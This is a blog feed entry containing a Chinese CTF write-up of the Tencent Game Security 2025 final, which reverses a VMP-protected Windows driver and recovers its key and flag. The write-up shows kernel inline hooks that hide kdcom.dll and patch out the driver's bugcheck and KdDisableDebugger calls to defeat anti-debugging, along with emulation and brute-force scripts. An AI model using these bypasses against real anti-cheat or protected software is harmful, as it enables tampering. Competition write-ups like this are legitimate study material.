<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xia0ji233&#39;s blog</title>
  
  <subtitle>学习应该像呼吸一样自然</subtitle>
  <link href="https://xia0ji233.github.io/atom.xml" rel="self"/>
  
  <link href="https://xia0ji233.github.io/"/>
  <updated>2025-04-13T16:22:54.719Z</updated>
  <id>https://xia0ji233.github.io/</id>
  
  <author>
    <name>xia0ji233</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>腾讯游戏安全竞赛2025决赛题解</title>
    <link href="https://xia0ji233.github.io/2025/04/14/tencent-race-2025-final/"/>
    <id>https://xia0ji233.github.io/2025/04/14/tencent-race-2025-final/</id>
    <published>2025-04-14T02:00:00.000Z</published>
    <updated>2025-04-13T16:22:54.719Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下今年 2025 决赛过程</p><span id="more"></span><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote><p>（1）<strong>在intel CPU&#x2F;64位Windows10系统</strong>上运行sys，成功加载驱动（0.5分）</p><p>（2）能在双机环境运行驱动并调试（1分）</p><p>（3）优化驱动中的耗时算法，并给出demo能快速计算得出正确的key（1分）</p><p>（4）分析并给出flag的计算执行流程（1.5分），能准确说明其串联逻辑（0.5分）</p><p>（5）正确解出flag（1分）</p><p>（6）该题目使用了一种外挂常用的隐藏手段，请给出多种检测方法，要求demo程序能在题目驱动运行的环境下进行精确检测，方法越多分数越高（3分）</p><p>（7）文档编写，详细描述解题过程，详述提供的解题程序的演示方法。做到清晰易懂，操作可以复现结果；编码工整风格优雅、注释详尽（1.5分）</p></blockquote><h2 id="加载驱动"><a href="#加载驱动" class="headerlink" title="加载驱动"></a>加载驱动</h2><p>驱动带反调，且目测有 VMP 壳，于是选择 dump+Fix，由于驱动带反调，会蓝屏，于是 hook 蓝屏代码，选择该时机去 dump 内存，找到 Entry。</p><img src="/2025/04/14/tencent-race-2025-final/1.png" class=""><p>随后跟进，遇到一些立即数的赋值，且有函数加密，直接选择模拟执行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ida_name</span><br><span class="line"><span class="keyword">import</span> mmap</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">base_addr = idaapi.get_imagebase()</span><br><span class="line">fix_function_start=<span class="number">0xFFFFF806FF8D9F0C</span></span><br><span class="line">fix_function_end=<span class="number">0xFFFFF806FF8DA05F</span></span><br><span class="line">PAGE_SIZE=<span class="number">0x1000</span></span><br><span class="line">RSP=<span class="number">0xdead0000</span></span><br><span class="line">RBP=<span class="number">0xdead0000</span></span><br><span class="line">map_addr=idaapi.get_imagebase()</span><br><span class="line">offset=base_addr-map_addr</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_mem_unmapped</span>(<span class="params">uc, access, address, size, value, user_data</span>):</span><br><span class="line">    aligned_addr = address&amp;<span class="number">0xFFFFFFFFFFFFF000</span> </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        uc.mem_map(aligned_addr, PAGE_SIZE)</span><br><span class="line">        data=idaapi.get_bytes(aligned_addr,PAGE_SIZE)</span><br><span class="line">        uc.mem_write(aligned_addr,data)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>  <span class="comment"># 表示错误已处理，继续执行</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] 动态映射内存页失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>  </span><br><span class="line"></span><br><span class="line">instr_count = <span class="number">0</span></span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">uc, address, size, user_data</span>):</span><br><span class="line">    <span class="keyword">global</span> instr_count,cnt</span><br><span class="line">    instr_count += <span class="number">1</span></span><br><span class="line">    rax=uc.reg_read(UC_X86_REG_RAX)</span><br><span class="line">    rcx=uc.reg_read(UC_X86_REG_RCX)</span><br><span class="line">    rdx=uc.reg_read(UC_X86_REG_RDX)</span><br><span class="line">    r8=uc.reg_read(UC_X86_REG_R8)</span><br><span class="line">    r9=uc.reg_read(UC_X86_REG_R9)</span><br><span class="line">    r10=uc.reg_read(UC_X86_REG_R10)</span><br><span class="line">    rbp=uc.reg_read(UC_X86_REG_RBP)</span><br><span class="line">    rsp=uc.reg_read(UC_X86_REG_RSP)</span><br><span class="line">    rip=uc.reg_read(UC_X86_REG_RIP)</span><br><span class="line">    <span class="keyword">if</span> rip==<span class="number">0xFFFFF806FF8DA05C</span>:</span><br><span class="line">        st=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">        offset=<span class="number">0xE0</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> uc.mem_read(rsp+offset,<span class="number">2</span>)==<span class="string">b&#x27;\x00\x00&#x27;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            st+=uc.mem_read(rsp+offset,<span class="number">1</span>)</span><br><span class="line">            offset+=<span class="number">2</span></span><br><span class="line">        <span class="built_in">print</span>(st)</span><br><span class="line">        <span class="comment">#print(uc.mem_read(rsp+offset))</span></span><br><span class="line">    </span><br><span class="line">mu = Uc(UC_ARCH_X86, UC_MODE_64)</span><br><span class="line">mu.reg_write(UC_X86_REG_RIP, fix_function_start)  <span class="comment"># 设置执行起始地址</span></span><br><span class="line">mu.reg_write(UC_X86_REG_R13, <span class="number">0xFF</span>)</span><br><span class="line">mu.reg_write(UC_X86_REG_RSP, RSP)</span><br><span class="line">mu.reg_write(UC_X86_REG_RBP, RBP)</span><br><span class="line">mu.mem_map(RSP-PAGE_SIZE,PAGE_SIZE*<span class="number">2</span>)</span><br><span class="line">mu.hook_add(UC_HOOK_MEM_FETCH_UNMAPPED, hook_mem_unmapped)</span><br><span class="line">mu.hook_add(UC_HOOK_MEM_READ_UNMAPPED, hook_mem_unmapped)</span><br><span class="line">mu.hook_add(UC_HOOK_MEM_WRITE_UNMAPPED, hook_mem_unmapped)</span><br><span class="line">mu.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line">instr_count=<span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(mu.reg_read(UC_X86_REG_RIP)))</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    mu.emu_start(fix_function_start,fix_function_end)</span><br><span class="line"><span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>最后得到一个注册表字符串 <code>\\Machine\\System\\CurrentControlSet\\Services\\ACEDriver\\2025ACECTF</code></p><img src="/2025/04/14/tencent-race-2025-final/3.png" class=""><p>正常直接加载驱动会返回 31 错误，猜测判定了注册表的某些东西，继续往下模拟可得一个字符串 Key。</p><img src="/2025/04/14/tencent-race-2025-final/4.png" class=""><p>模拟执行可以尽量挑不依赖外部函数，且立即数比较多的片段，这样可以省略计算的过程。</p><p>下面也可以模拟，但是根据题目描述也能猜个大概，有一个 <code>Key</code>，有一个 <code>Flag</code>。再结合该函数的定义和调用</p><img src="/2025/04/14/tencent-race-2025-final/5.png" class=""><p>不难得到 Key 应该是一个 <code>__int64</code> 的值，Flag 是一个字符串，保存到全局变量当中，创建对应的注册表项，成功加载驱动。</p><img src="/2025/04/14/tencent-race-2025-final/6.png" class=""><h2 id="调试驱动"><a href="#调试驱动" class="headerlink" title="调试驱动"></a>调试驱动</h2><p>前面说过，有反调试，观察导入表遍历了 <code>NtQuerySystemInformation</code>，于是想到可能是检测到了 <code>kdcom.dll</code> 模块（因为之前有游戏做过类似的检测），那么直接 hook 把 <code>kdcom.dll</code> 改名。</p><p>因为保护了 IAT，因此不能使用常规的 IAT hook，还是选择使用 <code>inline hook</code>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">gh_NtQuerySystemInformation</span><span class="params">(...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">unhook</span>();</span><br><span class="line">    <span class="keyword">auto</span> ret = ((NtQuerySystemInformation_t)(TargetFunction))(...);</span><br><span class="line">    <span class="keyword">if</span> (SystemInformationLength&amp;&amp; SystemInformationClass== SystemModuleInformation) &#123;</span><br><span class="line">        PSYSTEM_MODULE_INFORMATION pModInfo = (PSYSTEM_MODULE_INFORMATION)SystemInformation;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pModInfo-&gt;ModulesCount; i++) &#123;</span><br><span class="line">            PSYSTEM_MODULE_INFORMATION_ENTRY pEntry = &amp;pModInfo-&gt;Modules[i];</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strcmp</span>(pEntry-&gt;Name + pEntry-&gt;NameOffset, <span class="string">&quot;kdcom.dll&quot;</span>)) &#123;</span><br><span class="line">                (pEntry-&gt;Name + pEntry-&gt;NameOffset)[<span class="number">0</span>] = <span class="string">&#x27;x&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">rehook</span>();</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>绕过之后加载驱动不会蓝屏，但是会出现另一个错误。</p><img src="/2025/04/14/tencent-race-2025-final/7.png" class=""><p>随后查看 DbgView 发现似乎是 vmp 自带的，手上有 3.8 版本，尝试编译放进去加载，果然如此，一摸一样的错误代码。</p><img src="/2025/04/14/tencent-race-2025-final/8.png" class=""><h2 id="Key算法分析"><a href="#Key算法分析" class="headerlink" title="Key算法分析"></a>Key算法分析</h2><p>这个可以通过字符串定位，也可以由上面注册表继续往后分析得到。</p><img src="/2025/04/14/tencent-race-2025-final/9.png" class=""><p>当输入的 <code>Key</code> 为 <code>0</code> 时，尝试使用算法生成。通过分析该函数，结合一些一些字符串可知，该算法自己实现了一个双端队列（deque），但是实际使用的时候是把它当成栈来用了，实现了一个深度优先搜索算法。</p><p>第一步恢复 <code>deque</code> 结构体，第一个 8 字节是一个指向自身的指针，但是似乎没有用过，正常来说应该是虚表。双向队列会有全队列大小（队列最多容纳的元素个数），头指针还有尾指针，而通常情况下，后两者可以使用头指针 + 有效元素个数来实现，因此最后得到以下定义：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">deque</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *vtable;</span><br><span class="line">    data **map;</span><br><span class="line">    __int64 MAX_SIZE;</span><br><span class="line">    __int64 begin_idx;</span><br><span class="line">    __int64 size;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">data</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> x1;</span><br><span class="line">    <span class="type">int</span> y1;</span><br><span class="line">    _QWORD data2;</span><br><span class="line">    _QWORD data3;</span><br><span class="line">    <span class="type">int</span> x4;</span><br><span class="line">    <span class="type">int</span> y4;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>应用到 IDA 之后，配合注释，算法一目了然。</p><img src="/2025/04/14/tencent-race-2025-final/10.png" class=""><p>深入阅读它实现 deque 的源码其实可以明白，第一，它的 <code>MAX_SIZE</code> 一定是 2 的整数幂，并且它是环形队列。第二，在取模的时候更加高效（即 <code>&amp;(MAX_SIZE-1)</code>）。</p><p>循环开头压入了 <code>(44,22)</code> 元素。</p><p>每次循环开始，取得尾部的元素，判断 <code>x1</code> 是否为 0，或者说 <code>x==y</code>，如果是则删除该元素。</p><p>否则尝试先往左走（即 <code>x-1</code>）并立刻将往左走的点压入栈中重新循环，经典的 DFS。</p><img src="/2025/04/14/tencent-race-2025-final/11.png" class=""><p>往左走之后会将当前点标记为已经往左走过，这里 x4 的值有以下三种情况：</p><ul><li><code>0</code>：还没走过。</li><li><code>1</code>：已经往左走过。</li><li><code>2</code>：已经往左走过，且已经往左下走过。</li></ul><p>当 <code>x4==2</code> 时，该点也会被删除，并将，结合图中的注释大概也能看懂这个算法了，这里画了一个图更好理解</p><img src="/2025/04/14/tencent-race-2025-final/12.png" class=""><p>从黑色格子出发，只能向左或者向左上（y轴往下的情况下）。红色格子不能继续走，价值为1，同样在 y 0层也有一行红色格子价值为 <code>1</code>，其余格子价值均为 <code>x%5</code>，最后应该是计算黑色格子到红色格子的所有不同的路径的价值之和。</p><p>优化可以使用记忆化搜索，或者直接使用动态规划，记忆化搜索简单无脑，三行搞定。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> v[<span class="number">50</span>][<span class="number">50</span>];</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> f[<span class="number">50</span>][<span class="number">50</span>];</span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (x == y || !y)<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (f[x][y] != <span class="number">-1</span>)<span class="keyword">return</span> f[x][y];</span><br><span class="line"><span class="keyword">return</span> f[x][y] = x%<span class="number">5</span>+<span class="built_in">dfs</span>(x<span class="number">-1</span>,y)+<span class="built_in">dfs</span>(x<span class="number">-1</span>,y<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">memset</span>(f, <span class="number">-1</span>, <span class="built_in">sizeof</span>(f));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, <span class="built_in">dfs</span>(<span class="number">44</span>,<span class="number">22</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//7039739125714</span></span><br></pre></td></tr></table></figure><h2 id="调试驱动（续）"><a href="#调试驱动（续）" class="headerlink" title="调试驱动（续）"></a>调试驱动（续）</h2><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>反调试检测：</p><ul><li>题目检测 <code>kdcom.dll</code> 模块，检测到则直接 <code>&#39;ACE&#39;</code> 蓝屏。</li><li>题目有个线程一直在调用，<code>KdDisableDebugger</code></li></ul><p>绕过：</p><ul><li>对于第一个检测，把蓝屏函数直接返回即可。</li><li>对于第二个检测，把该api直接返回即可。</li></ul><h3 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h3><p>尝试 hook <code>NtQuerySystemInformation</code>，<code>KeBugCheckEx</code>，找到蓝屏的函数在 <code>0x74F0</code>，于是考虑在 <code>hook NtQuerySystemInformation</code> 的某个节点，把该函数 hook 直接返回，不会蓝屏，但是调试器被剥离。</p><p>调试发现是调用了 <code>KdDisableDebugger</code> 函数。</p><img src="/2025/04/14/tencent-race-2025-final/13.png" class=""><p>同样也是直接返回，操作完成后，可以发现驱动已经可以正常运行，且调试器正常工作。</p><img src="/2025/04/14/tencent-race-2025-final/14.png" class=""><p>这里代码实现仅仅变动了 hook 的 <code>NtQuerySystemInformation</code> 函数，因为有 <code>vmp</code> 壳，所以在加载的时候去 hook 是不明智的，直接在调用 <code>NtQuerySystemInformation</code> 的某一刻过掉即可。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">gh_NtQuerySystemInformation</span><span class="params">(...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">unhook</span>();</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    PVOID stack[MAX_BACKTRACE_DEPTH<span class="number">+1</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">RtlWalkFrameChain</span>(stack, MAX_BACKTRACE_DEPTH,<span class="number">0</span>);</span><br><span class="line">    <span class="type">bool</span> flag = <span class="number">0</span>;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_BACKTRACE_DEPTH; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(stack[i]&gt;= Hooks::Base &amp;&amp; stack[i] &lt;= (PVOID)((UINT64)Hooks::Base + Hooks::Size)) &#123;</span><br><span class="line">            flag = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">        <span class="type">char</span> code = <span class="number">0xC3</span>;</span><br><span class="line">        cnt += <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (cnt == <span class="number">3</span>) &#123;</span><br><span class="line">            DriverUtil::<span class="built_in">MDLWriteMemory</span>((PVOID)((UINT64)Hooks::Base + <span class="number">0x74f0</span>), &amp;code, <span class="number">1</span>);</span><br><span class="line">            DriverUtil::<span class="built_in">MDLWriteMemory</span>((PVOID)(KdDisableDebugger), &amp;code, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">rehook</span>();</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为壳似乎有 API 防 hook 的检测，如果不及时下掉钩子则会加载失败，因此选择在第三次调用之后下掉钩子并做反调试的相关 hook。</p><h2 id="Flag逻辑分析"><a href="#Flag逻辑分析" class="headerlink" title="Flag逻辑分析"></a>Flag逻辑分析</h2><p>结论：</p><ul><li>读取 <code>flag</code> 之后，先做一次单表映射的替换，这里是由 VT 实现的，hook点在（<code>+0x95DF</code>）</li><li>用输入的 <code>key</code> 对输入的 <code>flag</code> 进行异或加密。</li><li>开启 VT，使用 VT hook 过的 TEA 加密逻辑加密上一步得到的密文。</li><li>用VT hook rdmsr，使得 <code>rdmsr(0xE8)</code> 在 <code>check</code> 之前异或了一个密钥，这个密钥由输入的 <code>flag</code> 长度决定。</li></ul><p>从后续的逻辑来看，生成的 <code>key</code> 就是 <code>flag</code> 做某种加密的密钥。</p><img src="/2025/04/14/tencent-race-2025-final/15.png" class=""><p>这里的 <code>v10</code>，经过动态调试，记录了最高有效位，例如我现在输入的 <code>key=0x25312620c4fe</code>，占用 6 字节，所以最高有效位为第五位（从零开始），如图所示</p><img src="/2025/04/14/tencent-race-2025-final/16.png" class=""><p>因此第一步就是实现一个简单的异或加密，根据密钥的长度而定。</p><img src="/2025/04/14/tencent-race-2025-final/17.png" class=""><p>紧随其后的是 <code>TEA</code> 加密，和初赛一样，每两个字符零扩展成 <code>int</code> 之后放入 <code>TEA</code> 加密。</p><img src="/2025/04/14/tencent-race-2025-final/18.png" class=""><p>乍一看这里居然用了 <code>key</code> 的地址进行运算，实则不需要被他吓到，这么玩确实会导致每次加密的结果不一样，但是不代表就不可逆（后来嘎嘎被打脸），逆了一下发现逆推到第一个式子的时候推不动了。</p><p>经过调试，发现是代码被 VT hook 了，联想到之前要求一定是 <code>Intel CPU</code>。</p><img src="/2025/04/14/tencent-race-2025-final/19.png" class=""><p>可以看到单步执行得到的指令结果不符合预期，题目在此处开启 VT 环境。</p><img src="/2025/04/14/tencent-race-2025-final/20.png" class=""><p>在 <code>+0x5150</code> 处的函数实现 <code>hook</code> 的分发。</p><img src="/2025/04/14/tencent-race-2025-final/21.png" class=""><h2 id="计算正确的-Flag"><a href="#计算正确的-Flag" class="headerlink" title="计算正确的 Flag"></a>计算正确的 Flag</h2><p>答案：<code>flag: flag&#123;ACE_C0n9raTs0nPA55TheZ02S9AmeScTf#&#125;</code></p><p>由于分发函数过于庞大，且 VT 的hook是无痕的，因此考虑能否使用加密的弱点去实现 flag 的解密，由于 TEA 加密的输入是被零扩展的，因此实际 8 字节的分组只有 2 字节是有效的。</p><p>可以计算两字节的所有组合，获得它的密文结果，实施这个方法之前，需要确定，相同的密文，相同的 <code>key</code>，得到的一定是相同的输出，断 <code>TEA</code> 加密的 <code>call</code>，选中 <code>RCX</code> 的内存，改成全 0，得到 <code>A9 59 CF AB EB 9D A3 0A</code>，多个位置尝试发现得到的始终是这个结果，因此判定该方法可行。</p><p>这里方法就多起来了，第一可以把注册表写满 <code>0000-FFFF</code>，然后指定 <code>Key</code> 为 <code>0xFF</code>，就可以 dump 得到一份表，或者可以直接写一个驱动去调用那个功能，这里我选择了后者。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">VOID</span> <span class="params">(*TEAEnc)</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>*, <span class="type">unsigned</span> <span class="type">int</span>*)</span></span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ PDRIVER_OBJECT  DriverObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ PUNICODE_STRING RegistryPath</span></span></span><br><span class="line"><span class="params"><span class="function">)</span> </span>&#123;</span><br><span class="line">    DriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line"></span><br><span class="line">    TEAEnc teaEnc = (TEAEnc)<span class="number">0xFFFFF8032AC51560</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>] = &#123; <span class="number">0x00000089</span>, <span class="number">0x000000FE</span>, <span class="number">0x00000076</span>, <span class="number">0x000000A0</span> &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> data[<span class="number">2</span>] = &#123; <span class="number">0x00000000</span>, <span class="number">0x00000000</span> &#125;;</span><br><span class="line">    <span class="built_in">teaEnc</span>((<span class="type">unsigned</span> <span class="type">int</span>*)data, (<span class="type">unsigned</span> <span class="type">int</span>*)key);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">DBG_PRINT</span>(<span class="string">&quot;data[%d]=%02x\n&quot;</span>, i,((<span class="type">unsigned</span> <span class="type">char</span>*)data)[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>观察 windbg 的输出，得到了正确的运行结果：</p><img src="/2025/04/14/tencent-race-2025-final/22.png" class=""><p>理论可行，那就直接 for 爆一遍，然后存到内存里面，最后 windbg 直接 dump 出来。</p><img src="/2025/04/14/tencent-race-2025-final/23.png" class=""><p>但是发现直接 <code>dump</code> 无法直接查找得到，经检查，原来是 <code>rdmsr</code> 被 <code>VT hook</code>，做了一次异或加密，并且根据长度生成异或的密钥，很简单，直接把内存都置 0 就能直接拿到异或的密钥，并且密钥由输入的 <code>flag</code> 长度决定，34 长度的密钥为 <code>03 39 49 26 2F F6 F8 4E</code>。</p><p>做完异或加密之后，就可以配合 <code>dump</code> 的密文查表。</p><img src="/2025/04/14/tencent-race-2025-final/24.png" class=""><p>用如下脚本查表：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">target=b<span class="string">&#x27;\xc0\x6d\xda\x3f\xc9\x8d\x05\xff\x56\x62\x69\x55\x6c\xbb\xa4\x90\x57\xa0\xa6\x82\xfb\xa7\x8e\xe7\x69\x52\xf3\xc9\xf1\xd7\x1a\x88\xfd\x7b\xea\xa9\x91\x95\xe4\x02\xc5\xdd\xe7\xf6\x64\xcb\x0e\x88\xd9\xd2\x4e\x1e\x3b\xae\x27\x64\x2d\xfd\xca\x5c\x1c\x7b\xcc\xd0\xe7\x40\x6e\x5e\xef\xa9\x5d\x8a\xd3\x5d\x42\xfa\x72\x9a\x1b\x30\x2f\xdd\x72\xc2\xe5\xf3\x1c\x9b\xa4\xf0\x3b\x91\xe8\x3b\xc8\x4e\x1f\x8a\x40\x09\xf8\x6b\x7b\xb4\x8b\x42\x1d\x71\x81\x43\xac\xb9\x76\x42\x56\x05\x5f\xf1\xee\x5d\x7a\x2c\xfe\x48\x92\x7d\x5a\x41\x93\xd1\x4a\x47\x32\xb8\x98\xa1&#x27;</span></span><br><span class="line">table=<span class="built_in">open</span>(<span class="string">&quot;./enc.bin&quot;</span>,<span class="string">&quot;rb&quot;</span>).<span class="built_in">read</span>()</span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">136</span>,<span class="number">8</span>):</span><br><span class="line">    num = table.<span class="built_in">find</span>(target[i:i<span class="number">+8</span>])<span class="comment">//8</span></span><br><span class="line">    x=num<span class="comment">//256</span></span><br><span class="line">    y=num%<span class="number">256</span></span><br><span class="line">    <span class="built_in">print</span>(f<span class="string">&quot;&#123;x:02x&#125; 